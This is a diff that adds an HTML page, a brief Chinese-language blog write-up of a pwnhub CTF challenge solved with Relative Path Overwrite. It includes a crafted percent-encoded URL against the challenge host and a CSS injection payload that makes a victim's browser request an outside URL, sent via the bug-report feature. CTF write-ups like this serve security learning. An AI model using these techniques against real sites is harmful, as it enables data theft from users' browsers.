@@ -1,0 +1,119 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>pwnhub writeup | SeaFood&#39;s blog</title>
+  <meta name="author" content="SeaFood">
+  
+  <meta name="description" content="pwnhub wp 大物必须过刚看的RPO (Relative Path Overwrite) 相对路径覆盖就被人用来出题了蛮放上来凑个数
+http://blog.innerht.ml/rpo-gadgets/
+原理大概就是利用浏览器和服务器对url编码的解析方式不同当我们访问http://doma">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="pwnhub writeup"/>
+  <meta property="og:site_name" content="SeaFood&#39;s blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="SeaFood&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">SeaFood&#39;s blog</a></h1>
+  <h2><a href="/">es muss sein? es muss sein!</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-03-26T14:33:21.000Z"><a href="/2017/03/26/pwnhub-writeup/">2017-03-26</a></time>
+      
+      
+  
+    <h1 class="title">pwnhub writeup</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="pwnhub-wp-大物必须过"><a href="#pwnhub-wp-大物必须过" class="headerlink" title="pwnhub wp 大物必须过"></a>pwnhub wp 大物必须过</h1><p>刚看的<strong>RPO (Relative Path Overwrite) 相对路径覆盖</strong>就被人用来出题了蛮放上来凑个数</p>
+<p><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a></p>
+<p>原理大概就是利用浏览器和服务器对url编码的解析方式不同当我们访问<code>http://domain/1%2f2.php</code>时服务器会返回<code>http://domain/1/2.php</code>的内容而浏览器则会认为<code>1%2f2.php</code>为一个文件</p>
+<p>在这题的<code>52.80.19.55/classes.php</code>下是这样引入css的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"../../classes.css"</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>如果我们访问<code>http://52.80.19.55/user.php/341/a/b/..%2f..%2f..%2f..%2fclasses.php</code></p>
+<p>服务器返回的是<code>http://52.80.19.55/classes.php</code></p>
+<p>而浏览器认为<code>..%2f..%2f..%2f..%2fclasses.php</code>是一个文件则引入的css是</p>
+<p><code>http://52.80.19.55/user.php/341/classes.css</code>即<code>http://52.80.19.55/user.php/341</code></p>
+<p>我们只要注册时在Your study vow里写上我们要执行的css<code>{}*{background-image:url(url)}</code>然后把上面的url通过bug report发出去之后收到的头里就有flag了<del>忘记截图了</del></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2017 SeaFood
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+</body>
+</html>
